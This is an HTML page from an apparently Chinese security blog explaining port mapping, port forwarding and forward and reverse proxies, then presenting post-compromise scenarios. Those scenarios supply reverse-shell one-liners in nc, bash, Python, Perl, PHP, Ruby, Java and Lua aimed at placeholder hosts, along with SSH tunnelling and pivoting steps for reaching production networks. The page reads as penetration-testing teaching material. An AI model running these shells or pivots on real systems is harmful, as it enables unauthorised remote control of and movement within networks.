@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>代理与隧道概念总结及利用场景分析 | Sleeping Cat&#39;s Blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="概念总结端口映射端口映射（Port Mapping）是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。是NAT的一种。 它的功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代理与隧道概念总结及利用场景分析">
+<meta property="og:url" content="http://example.com/2020/09/14/%E4%BB%A3%E7%90%86%E4%B8%8E%E9%9A%A7%E9%81%93%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Sleeping Cat&#39;s Blogs">
+<meta property="og:description" content="概念总结端口映射端口映射（Port Mapping）是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。是NAT的一种。 它的功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-09-14T03:20:29.000Z">
+<meta property="article:modified_time" content="2020-09-14T08:50:40.894Z">
+<meta property="article:author" content="S.C.Y">
+<meta property="article:tag" content="代理">
+<meta property="article:tag" content="隧道">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Sleeping Cat&#39;s Blogs" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Sleeping Cat&#39;s Blogs</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-代理与隧道概念总结及利用场景分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/09/14/%E4%BB%A3%E7%90%86%E4%B8%8E%E9%9A%A7%E9%81%93%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%88%86%E6%9E%90/" class="article-date">
+  <time datetime="2020-09-14T03:20:29.000Z" itemprop="datePublished">2020-09-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      代理与隧道概念总结及利用场景分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h2><h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>端口映射（Port Mapping）是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。是NAT的一种。</p>
+<p>它的功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。</p>
+<a id="more"></a>
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>端口转发（Port forwarding），有时被叫做隧道，是安全壳(SSH) 为网络安全通信使用的一种方法。端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为，其使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内部）上的一个端口。</p>
+<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>正向代理:是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。</p>
+<p>正向代理的典型用途是为在防火墙内的局域网客户端提供访问Internet的途径。正向代理还可以使用缓冲特性减少网络使用率。</p>
+<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。</p>
+<p>通过在网络各处放置反向代理节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。</p>
+<p><strong>提醒：以上包含正向与反向，以下介绍的场景也涉及正向与反向。正向场景为把自己的交出去，反向场景为拿到别人的。</strong></p>
+<h2 id="利用场景分析"><a href="#利用场景分析" class="headerlink" title="利用场景分析"></a>利用场景分析</h2><p><strong>场景1：</strong>拿到一台内网主机的shell权限，想在外部使用内网主机的shell怎么办？</p>
+<p>常用方案1：使用nc反弹shell</p>
+<ol>
+<li>外网监听<code>nc -lvp 80</code></li>
+<li>内网连接，同时交出shell<code>nc x.x.x.x 80 -e /bin/sh</code></li>
+</ol>
+<p>常用方案2：使用bash反弹shell</p>
+<ol>
+<li>外网监听<code>nc -lvp 80</code></li>
+<li>内网连接，同时交出shell<code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/80 0&gt;&amp;1</code></li>
+</ol>
+<p>常用方案3：使用python反弹shell</p>
+<ol>
+<li>外网监听<code>nc -lvp 80</code></li>
+<li>内网连接，同时交出shell</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>其他方案：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line">nc -e /bin/sh <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1234</span></span><br><span class="line"></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<span class="regexp">/bin/</span>sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1234</span> &gt;<span class="regexp">/tmp/</span>f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x <span class="number">8888</span>|<span class="regexp">/bin/</span>sh|nc x.x.x.x <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] <span class="keyword">as</span> <span class="built_in">String</span>[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>个人理解：本质上来说所谓正向反向，这只是一个定义方式，比如A、B，<br>若A为客户端，B为服务端，A访问B视为正向，B访问A视为反向。</p>
+<p>其他场景：</p>
+<ol>
+<li>云主机监听<code>nc -lvp 80 -e /bin/sh</code></li>
+<li>客户机连接<code>nc x.x.x.x 80</code></li>
+</ol>
+<p><strong>场景2：</strong>拿到一台外网主机的SSH权限，想把某一端口转发出来或者把本地服务带上去（隧道）</p>
+<p>方案1：使用ssh做隧道转发</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 使用中转主机建立转发(隧道)，将要访问的主机与端口监听在客户端</span><br><span class="line"># 命令解释：在本地做监听，将要访问的转发端可达目标服务通过转发，监听在本地</span><br><span class="line">ssh -L &lt;listen port&gt;:&lt;target host&gt;:&lt;target port&gt; &lt;user&gt;@&lt;forward host&gt;</span><br><span class="line"></span><br><span class="line"># 使用中转主机建立转发(隧道)，将要访问的主机与端口监听在转发端</span><br><span class="line"># 命令解释：在转发做监听，将要访问的本地端可达目标服务通过转发，监听在转发端</span><br><span class="line">ssh -R &lt;listen port&gt;:&lt;target host&gt;:&lt;target port&gt; &lt;user&gt;@&lt;forward host&gt;</span><br><span class="line"></span><br><span class="line"># 使用中转机做动态转发，本地监听1080端口，类似SS、VPN等上网方式</span><br><span class="line">ssh -D &lt;listen port&gt; &lt;user&gt;@&lt;forward host&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>场景3：</strong>从办公网拿到一台生产网主机的SSH权限，想让生产网主机上网</p>
+<p>前提：办公网主机有上网权限，满足SSH连接生产条件<br>方案：</p>
+<ol>
+<li>将办公主机22端口映射给生产主机2222</li>
+<li>生产主机访问本机2222同时建立1080代理</li>
+<li>所有想上网的使用1080代理</li>
+</ol>
+<p><strong>其他方案：</strong></p>
+<ol>
+<li>lcx</li>
+<li>msf</li>
+<li>花生壳</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/09/14/%E4%BB%A3%E7%90%86%E4%B8%8E%E9%9A%A7%E9%81%93%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%88%86%E6%9E%90/" data-id="ckfawyig80008mwqt3eal9uh4" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%90%86/" rel="tag">代理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9A%A7%E9%81%93/" rel="tag">隧道</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/09/15/%E4%BD%BF%E7%94%A8putty%E9%80%9A%E8%BF%87HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E4%B8%8A%E7%BD%91/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          使用putty通过HTTP代理隧道上网
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/09/11/Python%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95HTTPS%E4%BB%A3%E7%90%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Python实现简单HTTPS代理</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BurpSuite/" rel="tag">BurpSuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E6%B8%97%E9%80%8F/" rel="tag">Web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/app/" rel="tag">app</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/" rel="tag">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/putty/" rel="tag">putty</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scapy/" rel="tag">scapy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%90%86/" rel="tag">代理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%A7%E9%81%93/" rel="tag">隧道</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/BurpSuite/" style="font-size: 10px;">BurpSuite</a> <a href="/tags/Web%E6%B8%97%E9%80%8F/" style="font-size: 10px;">Web渗透</a> <a href="/tags/app/" style="font-size: 10px;">app</a> <a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/putty/" style="font-size: 10px;">putty</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/scapy/" style="font-size: 10px;">scapy</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 20px;">代理</a> <a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">测试</a> <a href="/tags/%E9%9A%A7%E9%81%93/" style="font-size: 15px;">隧道</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/09/19/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8B%E5%A2%9E%E5%BC%BA%E6%89%AB%E6%8F%8F%E8%A7%84%E5%88%99%E6%8F%92%E4%BB%B6/">BurpSuite系列之增强扫描规则插件</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/17/%E8%AE%B0Python%E4%B8%ADscapy%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%97%AE%E9%A2%98/">记Python中scapy库的使用与问题</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95APP%E5%86%85%E5%AD%98%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%BF%87%E7%A8%8B/">记一次测试APP内存明文密码过程</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/15/%E4%BD%BF%E7%94%A8putty%E9%80%9A%E8%BF%87HTTP%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E4%B8%8A%E7%BD%91/">使用putty通过HTTP代理隧道上网</a>
+          </li>
+        
+          <li>
+            <a href="/2020/09/14/%E4%BB%A3%E7%90%86%E4%B8%8E%E9%9A%A7%E9%81%93%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%88%86%E6%9E%90/">代理与隧道概念总结及利用场景分析</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 S.C.Y<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
